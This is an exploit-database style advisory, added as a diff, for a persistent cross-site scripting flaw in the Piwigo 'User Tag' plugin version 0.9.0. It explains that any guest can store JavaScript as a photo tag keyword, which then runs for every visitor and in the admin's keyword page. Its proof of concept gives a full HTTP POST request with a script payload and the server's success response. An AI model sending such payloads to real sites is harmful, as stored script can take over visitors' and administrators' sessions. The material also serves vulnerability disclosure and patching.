@@ -1,0 +1,99 @@
+# Exploit Title: Piwigo plugin User Tag , Persistent XSS
+# Date: 10 Aug, 2017
+# Extension Version: 0.9.0
+# Software Link: http://piwigo.org/basics/downloads
+# Extension link : http://piwigo.org/ext/extension_view.php?eid=441
+# Exploit Author: Touhid M.Shaikh
+# Contact: http://twitter.com/touhidshaikh22
+# Website: http://touhidshaikh.com/
+# Category: webapps
+
+
+######## Description ########
+<!--
+    What is Piwigo ?
+    Piwigo is photo gallery software for the web, built by an active
+community of users and developers.Extensions make Piwigo easily
+customizable.Piwigo is a free and open source.
+
+    User Tag Extension in piwigo.
+    This plugin extends piwigo with the function to Allow visitors to add
+tags to photos.
+
+
+
+############ Requrment ##############
+
+Admin Must allow to user or guest for a tag in User Tag plugin option.
+
+
+######## Attact Description  ########
+<!--
+
+     User Tag Extension provides additional function on photo page for the
+user to tag any name of that image.
+
+
+NOTE: "test.touhidshaikh.com" this domain not registered on the internet.
+This domain host on local machine.
+
+==>START<==
+Any guest visitor or registered user can perform this.
+
+User Tag Extension adds an additional field(Keyword) on photo pages that
+let you tag a User Tag on the picture for visitor and registered user.
+
+click on that Field after that fill input text box with malicious code
+javascript and press Enter its stored as a User Tag keyword.
+
+Your Javascript Stored in Server's Database and execute every time when any
+visitor visit that photo.
+
+
+NOte: This is also executed in admin's dashboard when admin visit keyword
+page.
+
+-->
+
+######## Proof of Concept ########
+
+
+ *****Request*****
+
+POST /ws.php?format=json&method=user_tags.tags.update HTTP/1.1
+Host: test.touhidshaikh.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:54.0) Gecko/20100101
+Firefox/54.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-GB,hi;q=0.8,ar;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://test.touhidshaikh.com/picture.php?/4/category/1
+Content-Length: 83
+Cookie: _ga=GA1.2.392572598.1501252105; pwg_id=gsf3gp640oupaer3cjpnl22sr0
+Connection: close
+
+image_id=4&referer=picture.php%3F%2F4%2Fcategory%2F1&tags=<script>prompt()</script>
+
+**************************************************
+
+******Response********
+HTTP/1.1 200 OK
+Date: Thu, 10 Aug 2017 11:36:24 GMT
+Server: Apache/2.4.27 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 46
+Connection: close
+Content-Type: text/plain; charset=utf-8
+
+{"stat":"ok","result":{"info":"Tags updated"}}
+
+****************************************************
+
+
+####################################################
+
+
+Greetz: Thank You, All my Friends who support me. ;)
